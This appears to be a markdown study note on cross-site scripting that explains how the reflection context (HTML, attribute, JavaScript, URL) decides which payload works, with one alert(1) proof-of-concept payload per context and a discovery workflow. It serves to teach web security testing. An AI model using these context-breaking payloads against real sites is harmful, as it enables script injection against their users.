# Cross-Site Scripting Contexts

## Overview

When testing for XSS, the most important question is:

```text
Where Is My Input Reflected?
```

The answer determines:

```text
Payload Selection
Bypass Strategy
Exploitation Method
```

---

# Why Context Matters

The same payload may:

```text
Work In One Context
Fail In Another
```

Example:

```html
<script>alert(1)</script>
```

may work in:

```text
HTML Context
```

but fail in:

```text
Attribute Context
```

or

```text
JavaScript Context
```

---

# Main XSS Contexts

## HTML Context

Example:

```html
<p>USER_INPUT</p>
```

Payload:

```html
<script>alert(1)</script>
```

---

## Attribute Context

Example:

```html
<input value="USER_INPUT">
```

Payload:

```html
" onmouseover="alert(1)
```

---

## JavaScript Context

Example:

```javascript
var x = "USER_INPUT";
```

Payload:

```javascript
";alert(1);//
```

---

## URL Context

Example:

```html
<a href="USER_INPUT">
```

Payload:

```javascript
javascript:alert(1)
```

---

# Context Discovery Workflow

```text
Find Reflection
        ↓
Identify Context
        ↓
Choose Payload
        ↓
Verify Execution
```

---

# Related Theory

- 23-xss-between-html-tags.md
- 24-xss-in-html-tag-attributes.md

---

# Key Takeaways

- Context determines exploitability.
- Reflection alone is not enough.
- Payload selection depends on context.
- Understanding context is the foundation of XSS.